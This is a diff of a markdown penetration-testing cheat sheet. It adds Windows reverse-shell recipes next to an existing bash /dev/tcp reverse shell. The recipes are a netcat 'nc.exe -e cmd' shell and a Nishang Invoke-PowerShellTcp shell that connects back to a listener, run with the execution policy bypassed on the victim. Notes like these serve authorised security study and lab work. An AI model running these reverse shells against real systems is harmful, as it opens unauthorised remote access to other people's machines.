@@ -474,12 +474,17 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 #worked
 ````
 ### Windows
-This helps to create a more stable shell, upload nc32.exe or nc64.exe and catch a rever shell back to your kali machine
+#### Stable shell
 ````
 nc -nlvp 9001
 .\nc.exe <your kali IP> 9001 -e cmd
 ````
-
+#### Powershell
+````
+cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+echo "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444" >> Invoke-PowerShellTcp.ps1
+powershell -executionpolicy bypass -file Invoke-PowerShellTcp.ps1 #Once on victim run this
+````
 ## Port Forwarding/Tunneling <img src="https://cdn-icons-png.flaticon.com/512/3547/3547287.png" width="40" height="40" />
 ### Tools
 #### rinetd Port Fowarding
